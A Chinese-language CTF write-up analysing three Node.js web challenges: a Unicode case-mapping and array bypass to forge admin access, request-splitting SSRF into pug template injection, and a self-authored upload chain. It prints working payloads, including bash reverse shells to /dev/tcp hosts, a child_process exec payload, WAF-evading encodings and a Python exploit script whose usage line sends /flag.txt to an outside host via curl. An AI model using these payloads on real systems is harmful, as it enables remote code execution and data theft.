---
title: 近两次比赛遇到的node题目简析
comments: true
date: 2020-02-11 22:26:02
tags:
	- nodejs
	- 
categories:
	- 信息安全
	- writeup
keywords:
	- 2020
	- HackTM
	- HackIM
	- CTF
	- nodejs
	- node
	- Draw with us
	- split second

---

最近水了水国际赛(摸鱼选手)，两次比赛都出现了node的题目。感觉挺有意思的，拿来分析一下。

1. HackTM CTF 2020 - Draw with us
2. nullcon HackIM 2020 - split second
3. 自己出的 - node game

<!--more--->


## HackTM CTF 2020 - Draw with us

>Come draw with us!
>
>http://167.172.165.153:60000/
>
>Author: stackola
>
>**Hint!** Changing your color is the first step towards happiness.
>
>附件：https://pan.baidu.com/s/17Qa7bDkE9eceHsdj0g6BZg



一道nodejs源码审计的题目。只要细心审计就OK的。


首先先分析路由。发现存在/flag，直接跟进，看一下有什么验证。

```js
app.get("/flag", (req, res) => {
  // Get the flag
  // Only for root
  if (req.user.id == 0) {
    res.send(ok({ flag: flag }));
  } else {
    res.send(err("Unauthorized"));
  }
});
```



在这里，要求user.id==0，也就是说需要我们去伪造管理员身份。

继续分析，可以发现这题采用了jwt，jwt常见的攻击手法有两类

- 拿到secretkey，进而伪造jwt。（爆破，信息泄露）
- 修改jwt加密头为none。

详见https://xz.aliyun.com/t/2338



在这里，经过尝试都不太行。但是继续分析路由接口。

可以发现init是个后门，serverInfo是个信息泄露，而updateUser是信息泄露利用的关键点。

整体逻辑为：通过updateUser，添加泄露点n，进而通过serverInfo获取信息。然后采用n来利用init这个后门。



接下来继续按刚才的逻辑分析。先来说一下serverInfo。

serverInfo将当前用户有权限的信息打印出来，其信息是从config里取出。

![](http://img.5am3.com/5am3/img/20200205142502.png)

默认用户没有以上三个信息权限。由此可见p,n为敏感信息。进而去追他的利用链。

可以看到其在init中被调用，其md5值为target。然后和我们传入构造的pwHash作比较。之后执行了清空画板操作。所以猜测只要我们pwHash构造出来与target相等，即可伪造管理员。

继续往下看，可以看到113行这里，通过pwHash进而得到adminId，然后再121行返回admin的token。这正是我们想要的。

分析114，可以发现是将pwHash逐位于target做异或，然后累加，最终得到的即为adminId。

即我们要构造pwHash==target即可让adminId=0

![](http://img.5am3.com/5am3/img/20200205142630.png)



此时逻辑已经清楚，那么我们如何得到n？

继续回到updateUser，想办法将n加入到我们的权限中。

![](http://img.5am3.com/5am3/img/20200205143224.png)

![](http://img.5am3.com/5am3/img/20200205143347.png)

分析updateUser，可以发现，其判断是否为admin，通过uid得到user对象，进而对username转化为小写作比较。

那我们是不是可以通过注册大写字母用户绕过？不存在的。在注册的时候，就已经对用户名做限制了。

![](http://img.5am3.com/5am3/img/20200205143502.png)



此时有一个很奇怪的点。他们一个验证用的大写，一个验证小写。中间会不会出问题呢？也就是我们构造一个字符，符合下面条件

```js
username.toUpperCase() !== "hacktm".toUpperCase()
username.toLowerCase() == "hacktm".toLowerCase()
```



其实是可以的，在字符转换中，有些奇奇怪怪的字符，也是会被转换的。

比如：在toUpperCase()函数中，字符`ı`会转变为`I`，字符`ſ`会变为`S`。在toLowerCase()函数中，字符`İ`会转变为`i`，字符`K`会转变为`k`。

此时我们便可构造`hacKtm`来绕过。

紧接着往下，我们可以发现185行，对权限做了黑名单校验。禁止我们加入n的权限。在这里，可以直接通过数组绕过。将p放到数组里。

![](http://img.5am3.com/5am3/img/20200205144320.png)



至此，这道题基本已经OK了，接下来就是利用。

1. 注册`hacKtm`用户
2. 调用updateUser接口。

```json
{"color": "0xDEDBEE", "rights": [["n"]]}
```

3. 调用serverInfo接口，获取n
4. 调用init接口，传入p=n，q=1

```http
POST /init HTTP/1.1
Host: 167.172.165.153:60000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJiNTI3MjBkLTEyOGEtNDllYy1iMTc5LWU0NDUwZTdlODcxMSIsImlhdCI6MTU4MDg4NTQ1MH0.QKvGRVTj7IIpZvdtqPSpBNFFjl7woPBu7tSTI3gQLNo
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 314

{"p":"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979", "q":1}
```

5. 拿到返回token，置入cookie中，请求/flag接口

![](http://img.5am3.com/5am3/img/20200205145220.png)


## nullcon HackIM 2020 - split second

> Split that Shit
> http://web2.ctf.nullcon.net:8081/
>
> 源码：https://github.com/nullcon/hackim-2020/tree/master/web/split_second

打开题目，可以审查元素发现第一个hint。
![](http://img.5am3.com/5am3/img/20200209124732.png)
然后`http://web2.ctf.nullcon.net:8081/source`拿到源码，开始代码审计之旅。


分析题目，可以发现主页基本没什么东西，而是通过请求`/core`这个接口，来获取内容，并添加至主页。

还是从源码入手。可以发现`/core`接口是直接请求`/getMeme`接口，获取到数据。此时传入了q参数。

然后可以发现存在`/flag`接口，分析后，可以发现是个后门。并且需要本地访问。

根据以上信息，我们可以推断出，利用`/core`接口，造成ssrf，进而访问`/flag`后门，获取flag。

那问题来了，我们如何去得到一个ssrf？`/core`中，我们可以操控的点只有参数q。

经过查询资料，最终发现其实题目名称就是一个hint。有一种攻击方式是：拆分请求来实现的SSRF攻击。
可以参考：
- [通过拆分攻击实现的SSRF攻击](https://xz.aliyun.com/t/2894)
- [I-SOON2019-Membershop出题思路](https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/)

在这里就不细说了。

其实可以与CRLF注入类比一下。在这里，也是通过构造换行，来结束前一个请求，并构造出下一个请求。下面就是我们q的参数。我们只要成功注入，便会多一个发往flag的请求。

```
x HTTP/1.1\r\n\r\nGET /flag HTTP/1.1\r\nadminauth: secretpassword\r\npug: #{xxx}\r\n
```

```http
GET /core?q=x HTTP/1.1


GET /flag HTTP/1.1
adminauth: secretpassword
pug: #{xxx}

```

在nodejs中，其实对换行操作做了处理，但是在node8及以下，在处理unicode字符存在问题。可以导致换行符出现。具体可以看[上面文章](https://xz.aliyun.com/t/2894)

我们可以构造如下样子，来造出换行符
```
http://example.com/\u{010D}\u{010A}/test
```
可以通过以下js脚本，来进行编码。

```js

shellCodeRaw="\r\n"
var shellCodeRawList = shellCodeRaw.split("")
var shellCodeAsciiList= [];
for(var i=0;i<shellCodeRawList.length;i++){
	tmp = shellCodeRawList[i].charCodeAt()
	shellCodeAsciiList.push(tmp.toString(16));
}

shellcode=shellCodeAsciiList.join("}\\u{01");
shellcode= "\\u{01"+shellcode+"}"

eval("encodeURI('"+shellcode+"')")

// \r\n --> %C4%8D%C4%8A
// 空格 --> %C4%A0

// 构造如下参数
//z%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A
```

然后可以本地尝试以下。是否发出了两次请求。
由于原题目没有日志，我们修改源码，可以开启一下日志。添加如下两行即可。（记得`npm install morgan`)

```js
var morgan = require('morgan');
app.use(morgan('short'));
```

![](http://img.5am3.com/5am3/img/20200209132217.png)

至此，ssrf已经get。接下来分析`/flag`接口。
可以看到，其传入了两个参数，都是以headers的形式。
adminauth是一个密码，pug则是我们要渲染的模板内容。
了解过ssti的同学一定不陌生模板这个东西。
在nodejs中，pug是一个模板引擎。其表达式形式为`#{}`
(#因为其在url中特殊用途，所以需要按如上方式再次编码。)


我们只需构造我们的代码，来获取flag即可。

在这里我又陷入了一个深坑。
nodejs 的exec默认采用sh执行，而sh在不同系统指向也不同，主要分为bash和dash，如果在dash中执行以下命令反弹shell，是会出问题的。
```bash
bash -i >& /dev/tcp/10.0.1.98/7777 0>&1
```
具体可参考：[解决ubuntu反弹shell失败的问题](https://www.dazhuanlan.com/2019/11/15/5dce507a41df5/)

解决方法：
```bash
bash -c "bash -i >& /dev/tcp/evalip/2202 0>&1"
```

然后构造nodejs的反弹shell即可。

```js
global.process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/evalip/2202 0>&1"')
```
在pug模板中，不能直接用require，所以我们采用如上方式。

此时审查代码，可以发现这里有2个waf。
![](http://img.5am3.com/5am3/img/20200209213857.png)

![](http://img.5am3.com/5am3/img/20200209213933.png)

分别是，禁止列表内元素，以及禁止小写字母出现。

刚入门CTF时，大家可能都接触过，jsfuck，aaencode，jjencode，在这里，我分析以上三种编解码后，采取了jsfuck。

虽然jsfuck中存在`!`，但是我们根绝相关文档，可以将其替换为数字。
[jsfuck在线编码](https://www.bugku.com/tools/jsfuck/)

其实有!号含义，主要有以下几种。我们可以一一替换一下
```
false     =>  ![]   => (1==0)
true      =>  !![]   => (1==1)
1         =>  !+[]   => (1)
```
然后将我们的反弹shell的payload编码，然后将叹号做如上替换即可。
(先替换true，后替换false)

然后即可。最终payload如下：

```
// [jscode] 为构造好的js语句

x%C4%A0HTTP/1.1%C4%8D%C4%8A%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0/flag%C4%A0HTTP/1.1%C4%8D%C4%8Aadminauth:%C4%A0secretpassword%C4%8D%C4%8Apug:%C4%A0%C4%A3{[jscode]}%C4%8D%C4%8A%C4%8D%C4%8A
```

赛后看了一下主办方的wp，发现js这里编码很简单。自己搞的有点复杂了。字符太多了。学到了一个新姿势
```js

// 如下语法，可以当做eval使用。 
[].constructor.constructor("evalcode")()

// js中.和[]可以替换
[]["constructor"]["constructor"]("evalcode")()

// 在js中，字符串中，可以采用 \八进制数值
[]["\143\157\156\163\164\162\165\143\164\157\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("evalcode")()
```

所以我们可以通过以上编码来进行绕过。此时因为引号在waf中，但这个waf我们可以直接二次url编码绕过。

再有，通过wp得知，pug模板不止`#{}`一种方式，还可以直接`- code`。

至此，本题所有知识点都已经介绍完。学到了很多新姿势。

![](http://img.5am3.com/5am3/img/20200210123701.png)


##  自己出的 - node game

最近恰逢永信举办公益赛，出题没有太好的思路，恰好这两天比赛学到了点好玩的。

在比赛时，看到可以通过ssrf构造header头，便开始想了，可不可以构造上传呢？

当然是可以的，于是便有了这道题目。

在这道题目中，遇到了一个小问题，就是构造好payload后，无法正常使用。node端一直报无法获取参数、此时就很迷。
最后解决方式，是通过wireshark抓取loopback数据包，可以看到以下情况。

![](http://img.5am3.com/5am3/img/20200211224328.png)

我们可以发现有些字符依旧是url编码。我们需要将它再重编码一下。
最后可得正确payload。
```python
# exp.py

import requests
import sys

payloadRaw = """x HTTP/1.1

POST /file_upload HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
Content-Length: 6279
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/?action=upload
Upgrade-Insecure-Requests: 1

-----------------------------12837266501973088788260782942
Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"
Content-Type: ../template

- global.process.mainModule.require('child_process').execSync('evalcmd')
-----------------------------12837266501973088788260782942--


"""

def getParm(payload):
    payload = payload.replace(" ","%C4%A0")
    payload = payload.replace("\n","%C4%8D%C4%8A")
    payload = payload.replace("\"","%C4%A2")
    payload = payload.replace("'","%C4%A7")
    payload = payload.replace("`","%C5%A0")
    payload = payload.replace("!","%C4%A1")

    payload = payload.replace("+","%2B")
    payload = payload.replace(";","%3B")
    payload = payload.replace("&","%26")

    # Bypass Waf 
    payload = payload.replace("global","%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC")
    payload = payload.replace("process","%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("mainModule","%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5")
    payload = payload.replace("require","%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5")
    payload = payload.replace("root","%C5%B2%C5%AF%C5%AF%C5%B4")
    payload = payload.replace("child_process","%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("exec","%C5%A5%C5%B8%C5%A5%C5%A3")
    
    return payload

def run(url,cmd):
    payloadC =  payloadRaw.replace("evalcmd",cmd)
    urlC = url+"/core?q="+getParm(payloadC)
    requests.get(urlC)
    
    requests.get(url+"/?action=5am3_get_flag").text

if __name__ == '__main__':
    targetUrl = sys.argv[1]
    cmd = sys.argv[2]
    print run(targetUrl,cmd)

# python exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"

```





